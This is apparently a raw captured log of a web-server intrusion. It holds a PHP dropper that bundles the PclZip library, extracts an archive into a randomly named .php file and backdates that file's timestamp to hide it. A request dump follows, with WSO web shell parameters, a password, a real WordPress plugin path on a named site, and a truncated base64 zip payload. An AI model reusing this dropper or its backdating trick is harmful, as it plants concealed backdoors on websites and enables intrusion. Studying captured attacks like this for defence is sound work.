
  if ($v_data['extra_len'] != 0) {
    $p_header['extra'] = fread($this->zip_fd, $v_data['extra_len']);
  }
  else {
    $p_header['extra'] = '';
  }

  $p_header['version_extracted'] = $v_data['version'];
  $p_header['compression'] = $v_data['compression'];
  $p_header['size'] = $v_data['size'];
  $p_header['compressed_size'] = $v_data['compressed_size'];
  $p_header['crc'] = $v_data['crc'];
  $p_header['flag'] = $v_data['flag'];
  $p_header['filename_len'] = $v_data['filename_len'];

  $p_header['mdate'] = $v_data['mdate'];
  $p_header['mtime'] = $v_data['mtime'];
  if ($p_header['mdate'] && $p_header['mtime'])
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }


  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = "ok";

  return $v_result;
}

function privReadCentralFileHeader(&$p_header)
{
  $v_result=1;

  $v_binary_data = @fread($this->zip_fd, 4);
  $v_data = unpack('Vid', $v_binary_data);

  if ($v_data['id'] != 0x02014b50)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Invalid archive structure');

    return PclZip::errorCode();
  }

  $v_binary_data = fread($this->zip_fd, 42);

  if (strlen($v_binary_data) != 42)
  {
    $p_header['filename'] = "";
    $p_header['status'] = "invalid_header";

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid block size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $p_header = unpack('vversion/vversion_extracted/vflag/vcompression/vmtime/vmdate/Vcrc/Vcompressed_size/Vsize/vfilename_len/vextra_len/vcomment_len/vdisk/vinternal/Vexternal/Voffset', $v_binary_data);

  if ($p_header['filename_len'] != 0)
    $p_header['filename'] = fread($this->zip_fd, $p_header['filename_len']);
  else
    $p_header['filename'] = '';

  if ($p_header['extra_len'] != 0)
    $p_header['extra'] = fread($this->zip_fd, $p_header['extra_len']);
  else
    $p_header['extra'] = '';

  if ($p_header['comment_len'] != 0)
    $p_header['comment'] = fread($this->zip_fd, $p_header['comment_len']);
  else
    $p_header['comment'] = '';

  if (1)
  {
    $v_hour = ($p_header['mtime'] & 0xF800) >> 11;
    $v_minute = ($p_header['mtime'] & 0x07E0) >> 5;
    $v_seconde = ($p_header['mtime'] & 0x001F)*2;

    $v_year = (($p_header['mdate'] & 0xFE00) >> 9) + 1980;
    $v_month = ($p_header['mdate'] & 0x01E0) >> 5;
    $v_day = $p_header['mdate'] & 0x001F;

    $p_header['mtime'] = @mktime($v_hour, $v_minute, $v_seconde, $v_month, $v_day, $v_year);

  }
  else
  {
    $p_header['mtime'] = time();
  }

  $p_header['stored_filename'] = $p_header['filename'];

  $p_header['status'] = 'ok';

  if (substr($p_header['filename'], -1) == '/') {
    $p_header['external'] = 0x00000010;
  }


  return $v_result;
}

function privCheckFileHeaders(&$p_local_header, &$p_central_header)
{
  $v_result=1;

	if ($p_local_header['filename'] != $p_central_header['filename']) {
	}
	if ($p_local_header['version_extracted'] != $p_central_header['version_extracted']) {
	}
	if ($p_local_header['flag'] != $p_central_header['flag']) {
	}
	if ($p_local_header['compression'] != $p_central_header['compression']) {
	}
	if ($p_local_header['mtime'] != $p_central_header['mtime']) {
	}
	if ($p_local_header['filename_len'] != $p_central_header['filename_len']) {
	}

	if (($p_local_header['flag'] & 8) == 8) {
        $p_local_header['size'] = $p_central_header['size'];
        $p_local_header['compressed_size'] = $p_central_header['compressed_size'];
        $p_local_header['crc'] = $p_central_header['crc'];
	}

  return $v_result;
}

function privReadEndCentralDir(&$p_central_dir)
{
  $v_result=1;

  $v_size = filesize($this->zipname);
  @fseek($this->zip_fd, $v_size);
  if (@ftell($this->zip_fd) != $v_size)
  {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to go to the end of the archive \''.$this->zipname.'\'');

    return PclZip::errorCode();
  }

  $v_found = 0;
  if ($v_size > 26) {
    @fseek($this->zip_fd, $v_size-22);
    if (($v_pos = @ftell($this->zip_fd)) != ($v_size-22))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_binary_data = @fread($this->zip_fd, 4);
    $v_data = @unpack('Vid', $v_binary_data);

    if ($v_data['id'] == 0x06054b50) {
      $v_found = 1;
    }

    $v_pos = ftell($this->zip_fd);
  }

  if (!$v_found) {
    if ($v_maximum_size > $v_size)
      $v_maximum_size = $v_size;
    @fseek($this->zip_fd, $v_size-$v_maximum_size);
    if (@ftell($this->zip_fd) != ($v_size-$v_maximum_size))
    {
      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, 'Unable to seek back to the middle of the archive \''.$this->zipname.'\'');

      return PclZip::errorCode();
    }

    $v_pos = ftell($this->zip_fd);
    $v_bytes = 0x00000000;
    while ($v_pos < $v_size)
    {
      $v_byte = @fread($this->zip_fd, 1);

      $v_bytes = ( ($v_bytes & 0xFFFFFF) << 8) | Ord($v_byte); 

      if ($v_bytes == 0x504b0506)
      {
        $v_pos++;
        break;
      }

      $v_pos++;
    }

    if ($v_pos == $v_size)
    {

      PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Unable to find End of Central Dir Record signature");

      return PclZip::errorCode();
    }
  }

  $v_binary_data = fread($this->zip_fd, 18);

  if (strlen($v_binary_data) != 18)
  {

    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT, "Invalid End of Central Dir Record size : ".strlen($v_binary_data));

    return PclZip::errorCode();
  }

  $v_data = unpack('vdisk/vdisk_start/vdisk_entries/ventries/Vsize/Voffset/vcomment_size', $v_binary_data);

  if (($v_pos + $v_data['comment_size'] + 18) != $v_size) {

  if (0) {
    PclZip::privErrorLog(PCLZIP_ERR_BAD_FORMAT,
                       'The central dir is not at the end of the archive.'
					   .' Some trailing bytes exists after the archive.');

    return PclZip::errorCode();
  }
  }

  if ($v_data['comment_size'] != 0) {
    $p_central_dir['comment'] = fread($this->zip_fd, $v_data['comment_size']);
  }
  else
    $p_central_dir['comment'] = '';

  $p_central_dir['entries'] = $v_data['entries'];
  $p_central_dir['disk_entries'] = $v_data['disk_entries'];
  $p_central_dir['offset'] = $v_data['offset'];
  $p_central_dir['size'] = $v_data['size'];
  $p_central_dir['disk'] = $v_data['disk'];
  $p_central_dir['disk_start'] = $v_data['disk_start'];


  return $v_result;
}

function privDeleteByRule(&$p_result_list, &$p_options)
{
  $v_result=1;
  $v_list_detail = array();

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  $v_pos_entry = $v_central_dir['offset'];
  @rewind($this->zip_fd);
  if (@fseek($this->zip_fd, $v_pos_entry))
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

    return PclZip::errorCode();
  }

  $v_header_list = array();
  $j_start = 0;
  for ($i=0, $v_nb_extracted=0; $i<$v_central_dir['entries']; $i++)
  {

    $v_header_list[$v_nb_extracted] = array();
    if (($v_result = $this->privReadCentralFileHeader($v_header_list[$v_nb_extracted])) != 1)
    {
      $this->privCloseFd();

      return $v_result;
    }


    $v_header_list[$v_nb_extracted]['index'] = $i;

    $v_found = false;

    if (   (isset($p_options[PCLZIP_OPT_BY_NAME]))
        && ($p_options[PCLZIP_OPT_BY_NAME] != 0)) {

        for ($j=0; ($j<sizeof($p_options[PCLZIP_OPT_BY_NAME])) && (!$v_found); $j++) {

            if (substr($p_options[PCLZIP_OPT_BY_NAME][$j], -1) == "/") {

                if (   (strlen($v_header_list[$v_nb_extracted]['stored_filename']) > strlen($p_options[PCLZIP_OPT_BY_NAME][$j]))
                    && (substr($v_header_list[$v_nb_extracted]['stored_filename'], 0, strlen($p_options[PCLZIP_OPT_BY_NAME][$j])) == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
                elseif (   (($v_header_list[$v_nb_extracted]['external']&0x00000010)==0x00000010) 
                        && ($v_header_list[$v_nb_extracted]['stored_filename'].'/' == $p_options[PCLZIP_OPT_BY_NAME][$j])) {
                    $v_found = true;
                }
            }
            elseif ($v_header_list[$v_nb_extracted]['stored_filename'] == $p_options[PCLZIP_OPT_BY_NAME][$j]) {
                $v_found = true;
            }
        }
    }


    else if (   (isset($p_options[PCLZIP_OPT_BY_PREG]))
             && ($p_options[PCLZIP_OPT_BY_PREG] != "")) {

        if (preg_match($p_options[PCLZIP_OPT_BY_PREG], $v_header_list[$v_nb_extracted]['stored_filename'])) {
            $v_found = true;
        }
    }

    else if (   (isset($p_options[PCLZIP_OPT_BY_INDEX]))
             && ($p_options[PCLZIP_OPT_BY_INDEX] != 0)) {

        for ($j=$j_start; ($j<sizeof($p_options[PCLZIP_OPT_BY_INDEX])) && (!$v_found); $j++) {

            if (($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['start']) && ($i<=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end'])) {
                $v_found = true;
            }
            if ($i>=$p_options[PCLZIP_OPT_BY_INDEX][$j]['end']) {
                $j_start = $j+1;
            }

            if ($p_options[PCLZIP_OPT_BY_INDEX][$j]['start']>$i) {
                break;
            }
        }
    }
    else {
    	$v_found = true;
    }

    if ($v_found)
    {
      unset($v_header_list[$v_nb_extracted]);
    }
    else
    {
      $v_nb_extracted++;
    }
  }

  if ($v_nb_extracted > 0) {

      $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

      $v_temp_zip = new PclZip($v_zip_temp_name);

      if (($v_result = $v_temp_zip->privOpenFd('wb')) != 1) {
          $this->privCloseFd();

          return $v_result;
      }

      for ($i=0; $i<sizeof($v_header_list); $i++) {

          @rewind($this->zip_fd);
          if (@fseek($this->zip_fd,  $v_header_list[$i]['offset'])) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              PclZip::privErrorLog(PCLZIP_ERR_INVALID_ARCHIVE_ZIP, 'Invalid archive size');

              return PclZip::errorCode();
          }

          $v_local_header = array();
          if (($v_result = $this->privReadFileHeader($v_local_header)) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
          
          if ($this->privCheckFileHeaders($v_local_header,
		                                $v_header_list[$i]) != 1) {
          }
          unset($v_local_header);

          if (($v_result = $v_temp_zip->privWriteFileHeader($v_header_list[$i])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          if (($v_result = PclZipUtilCopyBlock($this->zip_fd, $v_temp_zip->zip_fd, $v_header_list[$i]['compressed_size'])) != 1) {
              $this->privCloseFd();
              $v_temp_zip->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }
      }

      $v_offset = @ftell($v_temp_zip->zip_fd);

      for ($i=0; $i<sizeof($v_header_list); $i++) {
          if (($v_result = $v_temp_zip->privWriteCentralFileHeader($v_header_list[$i])) != 1) {
              $v_temp_zip->privCloseFd();
              $this->privCloseFd();
              @unlink($v_zip_temp_name);

              return $v_result;
          }

          $v_temp_zip->privConvertHeader2FileInfo($v_header_list[$i], $p_result_list[$i]);
      }


      $v_comment = '';
      if (isset($p_options[PCLZIP_OPT_COMMENT])) {
        $v_comment = $p_options[PCLZIP_OPT_COMMENT];
      }

      $v_size = @ftell($v_temp_zip->zip_fd)-$v_offset;

      if (($v_result = $v_temp_zip->privWriteCentralHeader(sizeof($v_header_list), $v_size, $v_offset, $v_comment)) != 1) {
          unset($v_header_list);
          $v_temp_zip->privCloseFd();
          $this->privCloseFd();
          @unlink($v_zip_temp_name);

          return $v_result;
      }

      $v_temp_zip->privCloseFd();
      $this->privCloseFd();

      @unlink($this->zipname);

      PclZipUtilRename($v_zip_temp_name, $this->zipname);
  
      unset($v_temp_zip);
  }
  
  else if ($v_central_dir['entries'] != 0) {
      $this->privCloseFd();

      if (($v_result = $this->privOpenFd('wb')) != 1) {
        return $v_result;
      }

      if (($v_result = $this->privWriteCentralHeader(0, 0, 0, '')) != 1) {
        return $v_result;
      }

      $this->privCloseFd();
  }

  return $v_result;
}

function privDirCheck($p_dir, $p_is_dir=false)
{
  $v_result = 1;


  if (($p_is_dir) && (substr($p_dir, -1)=='/'))
  {
    $p_dir = substr($p_dir, 0, strlen($p_dir)-1);
  }

  if ((is_dir($p_dir)) || ($p_dir == ""))
  {
    return 1;
  }

  $p_parent_dir = dirname($p_dir);

  if ($p_parent_dir != $p_dir)
  {
    if ($p_parent_dir != "")
    {
      if (($v_result = $this->privDirCheck($p_parent_dir)) != 1)
      {
        return $v_result;
      }
    }
  }

  if (!@mkdir($p_dir, 0777))
  {
    PclZip::privErrorLog(PCLZIP_ERR_DIR_CREATE_FAIL, "Unable to create directory '$p_dir'");

    return PclZip::errorCode();
  }

  return $v_result;
}

function privMerge(&$p_archive_to_add)
{
  $v_result=1;

  if (!is_file($p_archive_to_add->zipname))
  {

    $v_result = 1;

    return $v_result;
  }

  if (!is_file($this->zipname))
  {

    $v_result = $this->privDuplicate($p_archive_to_add->zipname);

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('rb')) != 1)
  {
    return $v_result;
  }

  $v_central_dir = array();
  if (($v_result = $this->privReadEndCentralDir($v_central_dir)) != 1)
  {
    $this->privCloseFd();
    return $v_result;
  }

  @rewind($this->zip_fd);

  if (($v_result=$p_archive_to_add->privOpenFd('rb')) != 1)
  {
    $this->privCloseFd();

    return $v_result;
  }

  $v_central_dir_to_add = array();
  if (($v_result = $p_archive_to_add->privReadEndCentralDir($v_central_dir_to_add)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    return $v_result;
  }

  @rewind($p_archive_to_add->zip_fd);

  $v_zip_temp_name = PCLZIP_TEMPORARY_DIR.uniqid('pclzip-').'.tmp';

  if (($v_zip_temp_fd = @fopen($v_zip_temp_name, 'wb')) == 0)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open temporary file \''.$v_zip_temp_name.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = $v_central_dir['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['offset'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_offset = @ftell($v_zip_temp_fd);

  $v_size = $v_central_dir['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($this->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_size = $v_central_dir_to_add['size'];
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = @fread($p_archive_to_add->zip_fd, $v_read_size);
    @fwrite($v_zip_temp_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $v_comment = $v_central_dir['comment'].' '.$v_central_dir_to_add['comment'];

  $v_size = @ftell($v_zip_temp_fd)-$v_offset;

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  if (($v_result = $this->privWriteCentralHeader($v_central_dir['entries']+$v_central_dir_to_add['entries'], $v_size, $v_offset, $v_comment)) != 1)
  {
    $this->privCloseFd();
    $p_archive_to_add->privCloseFd();
    @fclose($v_zip_temp_fd);
    $this->zip_fd = null;

    unset($v_header_list);

    return $v_result;
  }

  $v_swap = $this->zip_fd;
  $this->zip_fd = $v_zip_temp_fd;
  $v_zip_temp_fd = $v_swap;

  $this->privCloseFd();
  $p_archive_to_add->privCloseFd();

  @fclose($v_zip_temp_fd);

  @unlink($this->zipname);

  PclZipUtilRename($v_zip_temp_name, $this->zipname);

  return $v_result;
}

function privDuplicate($p_archive_filename)
{
  $v_result=1;

  if (!is_file($p_archive_filename))
  {

    $v_result = 1;

    return $v_result;
  }

  if (($v_result=$this->privOpenFd('wb')) != 1)
  {
    return $v_result;
  }

  if (($v_zip_temp_fd = @fopen($p_archive_filename, 'rb')) == 0)
  {
    $this->privCloseFd();

    PclZip::privErrorLog(PCLZIP_ERR_READ_OPEN_FAIL, 'Unable to open archive file \''.$p_archive_filename.'\' in binary write mode');

    return PclZip::errorCode();
  }

  $v_size = filesize($p_archive_filename);
  while ($v_size != 0)
  {
    $v_read_size = ($v_size < PCLZIP_READ_BLOCK_SIZE ? $v_size : PCLZIP_READ_BLOCK_SIZE);
    $v_buffer = fread($v_zip_temp_fd, $v_read_size);
    @fwrite($this->zip_fd, $v_buffer, $v_read_size);
    $v_size -= $v_read_size;
  }

  $this->privCloseFd();

  @fclose($v_zip_temp_fd);

  return $v_result;
}

function privErrorLog($p_error_code=0, $p_error_string='')
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclError($p_error_code, $p_error_string);
  }
  else {
    $this->error_code = $p_error_code;
    $this->error_string = $p_error_string;
  }
}

function privErrorReset()
{
  if (PCLZIP_ERROR_EXTERNAL == 1) {
    PclErrorReset();
  }
  else {
    $this->error_code = 0;
    $this->error_string = '';
  }
}

function privDisableMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

$this->magic_quotes_status = @get_magic_quotes_runtime();

if ($this->magic_quotes_status == 1) {
  @set_magic_quotes_runtime(0);
}

  return $v_result;
}

function privSwapBackMagicQuotes()
{
  $v_result=1;

  if (   (!function_exists("get_magic_quotes_runtime"))
    || (!function_exists("set_magic_quotes_runtime"))) {
    return $v_result;
}

  if ($this->magic_quotes_status != -1) {
    return $v_result;
}

if ($this->magic_quotes_status == 1) {
	  @set_magic_quotes_runtime($this->magic_quotes_status);
}

  return $v_result;
}

}

function PclZipUtilPathReduction($p_dir)
{
  $v_result = "";

  if ($p_dir != "") {
    $v_list = explode("/", $p_dir);

    $v_skip = 0;
    for ($i=sizeof($v_list)-1; $i>=0; $i--) {
      if ($v_list[$i] == ".") {
      }
      else if ($v_list[$i] == "..") {
	  $v_skip++;
      }
      else if ($v_list[$i] == "") {
	  if ($i == 0) {
          $v_result = "/".$v_result;
	    if ($v_skip > 0) {
	        $v_result = $p_dir;
              $v_skip = 0;
	    }
	  }
	  else if ($i == (sizeof($v_list)-1)) {
          $v_result = $v_list[$i];
	  }
	  else {
	  }
      }
      else {
	  if ($v_skip > 0) {
	    $v_skip--;
	  }
	  else {
          $v_result = $v_list[$i].($i!=(sizeof($v_list)-1)?"/".$v_result:"");
	  }
      }
    }
    
    if ($v_skip > 0) {
      while ($v_skip > 0) {
          $v_result = '../'.$v_result;
          $v_skip--;
      }
    }
  }

  return $v_result;
}

function PclZipUtilPathInclusion($p_dir, $p_path)
{
  $v_result = 1;
  
  if (   ($p_dir == '.')
      || ((strlen($p_dir) >=2) && (substr($p_dir, 0, 2) == './'))) {
    $p_dir = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_dir, 1);
  }
  if (   ($p_path == '.')
      || ((strlen($p_path) >=2) && (substr($p_path, 0, 2) == './'))) {
    $p_path = PclZipUtilTranslateWinPath(getcwd(), FALSE).'/'.substr($p_path, 1);
  }

  $v_list_dir = explode("/", $p_dir);
  $v_list_dir_size = sizeof($v_list_dir);
  $v_list_path = explode("/", $p_path);
  $v_list_path_size = sizeof($v_list_path);

  $i = 0;
  $j = 0;
  while (($i < $v_list_dir_size) && ($j < $v_list_path_size) && ($v_result)) {

    if ($v_list_dir[$i] == '') {
      $i++;
      continue;
    }
    if ($v_list_path[$j] == '') {
      $j++;
      continue;
    }

    if (($v_list_dir[$i] != $v_list_path[$j]) && ($v_list_dir[$i] != '') && ( $v_list_path[$j] != ''))  {
      $v_result = 0;
    }

    $i++;
    $j++;
  }

  if ($v_result) {
    while (($j < $v_list_path_size) && ($v_list_path[$j] == '')) $j++;
    while (($i < $v_list_dir_size) && ($v_list_dir[$i] == '')) $i++;

    if (($i >= $v_list_dir_size) && ($j >= $v_list_path_size)) {
      $v_result = 2;
    }
    else if ($i < $v_list_dir_size) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilCopyBlock($p_src, $p_dest, $p_size, $p_mode=0)
{
  $v_result = 1;

  if ($p_mode==0)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==1)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @fwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==2)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @fread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }
  else if ($p_mode==3)
  {
    while ($p_size != 0)
    {
      $v_read_size = ($p_size < PCLZIP_READ_BLOCK_SIZE ? $p_size : PCLZIP_READ_BLOCK_SIZE);
      $v_buffer = @gzread($p_src, $v_read_size);
      @gzwrite($p_dest, $v_buffer, $v_read_size);
      $p_size -= $v_read_size;
    }
  }

  return $v_result;
}

function PclZipUtilRename($p_src, $p_dest)
{
  $v_result = 1;

  if (!@rename($p_src, $p_dest)) {

    if (!@copy($p_src, $p_dest)) {
      $v_result = 0;
    }
    else if (!@unlink($p_src)) {
      $v_result = 0;
    }
  }

  return $v_result;
}

function PclZipUtilOptionText($p_option)
{
  
  $v_list = get_defined_constants();
  for (reset($v_list); $v_key = key($v_list); next($v_list)) {
    $v_prefix = substr($v_key, 0, 10);
    if ((   ($v_prefix == 'PCLZIP_OPT')
         || ($v_prefix == 'PCLZIP_CB_')
         || ($v_prefix == 'PCLZIP_ATT'))
        && ($v_list[$v_key] == $p_option)) {
      return $v_key;
    }
  }
  
  $v_result = 'Unknown';

  return $v_result;
}

function PclZipUtilTranslateWinPath($p_path, $p_remove_disk_letter=true)
{
  if (stristr(php_uname(), 'windows')) {
    if (($p_remove_disk_letter) && (($v_position = strpos($p_path, ':')) != false)) {
        $p_path = substr($p_path, $v_position+1);
    }
    if ((strpos($p_path, '\\') > 0) || (substr($p_path, 0,1) == '\\')) {
        $p_path = strtr($p_path, '\\', '/');
    }
  }
  return $p_path;
}




$archive = new PclZip("nowir.zip");
if ($archive->extract() == 0) {
die("Error : ".$archive->errorInfo(true));
}
else
{
die("1425756856");	
}";
            $file_name = "286978ba973.php";
            if( file_exists($file_name) ){
                copy($file_name, $file_name."_backup");
            }
            if( file_put_contents($file_name, base64_decode($a)) )
            {		
                echo "OK file saved";
                touch($file_name, time() - 3600 * 24 * rand(10, 70));
            }
    [p2] => 
    [p3] => 
    [charset] => UTF-8
    [pass] => nhzgrf
)

_COOKIE
 Array
(
)

_FILES
 
END _FILES
 $my_blog=http://www.stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
pass parameter, acting as WSO
Acting as WSO, login cookie.
a = Php
c = 
p1 = $a="<?php 
if( isset($_REQUEST["test_url"]) ){
echo "file test okay";

}


$data = base64_decode("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